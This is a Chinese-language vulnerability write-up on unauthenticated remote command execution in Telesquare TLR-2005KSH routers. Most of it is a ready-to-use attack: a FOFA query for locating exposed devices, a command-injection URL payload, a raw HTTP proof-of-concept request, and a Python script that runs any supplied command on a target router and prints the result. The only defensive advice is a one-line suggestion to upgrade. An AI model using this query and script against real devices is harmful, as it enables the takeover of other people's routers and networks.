**漏洞名称**

Telesquare TLR-2005KSH路由器未经授权的远程命令执行漏洞



**漏洞影响**

TLR-2005Ksh 1.0.0版本和1.1.4版本

**漏洞描述**

Telesquare TLR-2005KSH是韩国Telesquare公司的一款路由器。Telesquare TLR-2005Ksh版本1.0.0和1.1.4存在未经授权的远程命令执行漏洞。攻击者可以利用此漏洞在未经cmd参数授权的情况下执行系统命令，并获取服务器权限。

**FOFA搜索语句**

```
title="Login to TLR-2005KSH"
```

**漏洞复现**

Payload

```
/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig
```

get请求，直接使用浏览器访问，查看ifconfig

POC数据包如下



```yaml

GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

漏洞复现成功



```python

import sys
import requests
import xml.etree.ElementTree as ET


def get_systemutil_response(url, command, proxy):
    endpoint = f"/cgi-bin/admin.cgi?Command=sysCommand&Cmd={command}"
    full_url = url.rstrip('/') + endpoint
    headers = {
        'Referer': url,
    }
    try:
        response = requests.get(full_url, headers=headers, proxies=proxy)
        if response.status_code == 200:
            print("Response from", full_url)
            #print(response.text)
            root = ET.fromstring(response.text)
            for cmd_result in root.findall('CmdResult'):
                data = cmd_result.text.strip()
                print(data)
        else:
            print("Error: Failed to fetch data. Status code:", response.status_code)
    except requests.exceptions.RequestException as e:
        print("Error:", e)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <command>")
        sys.exit(1)
    url = sys.argv[1]
    command = sys.argv[2]
    proxy = {
        'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080',
    }
    get_systemutil_response(url, command, proxy)
```



07

**修复建议**



升级到最新版本。